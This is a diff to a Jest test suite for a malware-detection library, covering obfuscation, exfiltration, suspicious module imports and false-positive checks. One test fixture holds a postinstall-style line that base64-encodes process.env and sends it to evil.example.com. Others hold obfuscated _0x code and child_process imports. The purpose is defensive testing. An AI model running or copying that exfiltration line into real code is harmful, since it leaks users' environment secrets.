@@ -5,6 +5,7 @@
 
 import { describe, it, expect } from '@jest/globals';
 import { detectMalware } from '../../src/lib/detection';
+import { detectFileThreats } from '../../src/lib/customRuleEngine';
 
 describe('Threat Detection', () => {
   describe('obfuscated variable names', () => {
@@ -19,7 +20,10 @@ describe('Threat Detection', () => {
       expect(result.length).toBeGreaterThan(0);
       const types = result.map((t) => t.type);
       expect(
-        types.some((t) => t === 'OBFUSCATED_CODE' || t === 'MALICIOUS_CODE_STRUCTURE' || t === 'MALICIOUS_CODE')
+        types.some(
+          (t) =>
+            t === 'OBFUSCATED_CODE' || t === 'MALICIOUS_CODE_STRUCTURE' || t === 'MALICIOUS_CODE'
+        )
       ).toBe(true);
     });
 
@@ -31,9 +35,7 @@ describe('Threat Detection', () => {
       `;
       const result = detectMalware(cleanContent);
       expect(Array.isArray(result)).toBe(true);
-      const highSeverity = result.filter(
-        (t) => t.severity === 'HIGH' || t.severity === 'CRITICAL'
-      );
+      const highSeverity = result.filter((t) => t.severity === 'HIGH' || t.severity === 'CRITICAL');
       expect(highSeverity).toHaveLength(0);
     });
   });
@@ -60,9 +62,11 @@ describe('Threat Detection', () => {
         const https = require('https');
         https.get('https://evil.example.com/collect?d=' + Buffer.from(JSON.stringify(process.env)).toString('base64'));
       `;
-      const result = detectMalware(maliciousContent, 'postinstall.js');
+      // Exfiltration is a rule-engine detection, so go through detectFileThreats
+      // with default options (built-in rules on).
+      const result = detectFileThreats(maliciousContent, 'postinstall.js', {}, detectMalware);
       expect(Array.isArray(result)).toBe(true);
-      expect(result.length).toBeGreaterThan(0);
+      expect(result.some((t) => String(t.type).includes('DATA_EXFILTRATION'))).toBe(true);
     });
   });
 
@@ -75,8 +79,50 @@ describe('Threat Detection', () => {
       expect(result.length).toBeGreaterThan(0);
       const types = result.map((t) => t.type);
       expect(
-        types.some((t) => t === 'OBFUSCATED_CODE' || t === 'MALICIOUS_CODE_STRUCTURE' || t === 'MALICIOUS_CODE')
+        types.some(
+          (t) =>
+            t === 'OBFUSCATED_CODE' || t === 'MALICIOUS_CODE_STRUCTURE' || t === 'MALICIOUS_CODE'
+        )
       ).toBe(true);
+    });
+  });
+
+  describe('false-positive guards', () => {
+    it('does not flag a large but ordinary module', () => {
+      const fn = (i: number) =>
+        `export function helper${i}(input) {\n  const value = String(input).trim();\n  return value.length > 0 ? value : null;\n}\n`;
+      const big = Array.from({ length: 200 }, (_, i) => fn(i)).join('\n');
+      expect(big.length).toBeGreaterThan(5000);
+      const structural = detectMalware(big).filter((t) => t.type === 'MALICIOUS_CODE_STRUCTURE');
+      expect(structural).toHaveLength(0);
+    });
+
+    it('does not flag high entropy on its own', () => {
+      const content =
+        'const token = "aZ9!qW3#eR7$tY1%uI5^oP2&lK8*jH4(gF6)dS0_xC";\nconst other = "QmRe3Vv8bNp1Lw5Zx9Jt2Kc7Hf4Gd6Sa0";';
+      const structural = detectMalware(content).filter(
+        (t) => t.type === 'MALICIOUS_CODE_STRUCTURE'
+      );
+      expect(structural).toHaveLength(0);
+    });
+  });
+
+  describe('obfuscator identifiers', () => {
+    it('flags javascript-obfuscator style _0x identifiers', () => {
+      const content = 'var _0x4a1b=["a","b"];function _0x2c3d(_0x5e6f){return _0x4a1b[_0x5e6f];}';
+      const types = detectMalware(content).map((t) => t.type);
+      expect(types).toContain('MALICIOUS_CODE_STRUCTURE');
+    });
+  });
+
+  describe('suspicious module requires', () => {
+    it('matches require with double quotes and import syntax', () => {
+      expect(detectMalware('const cp = require("child_process");').map((t) => t.type)).toContain(
+        'SUSPICIOUS_MODULE'
+      );
+      expect(
+        detectMalware("import { exec } from 'node:child_process';").map((t) => t.type)
+      ).toContain('SUSPICIOUS_MODULE');
     });
   });
 });
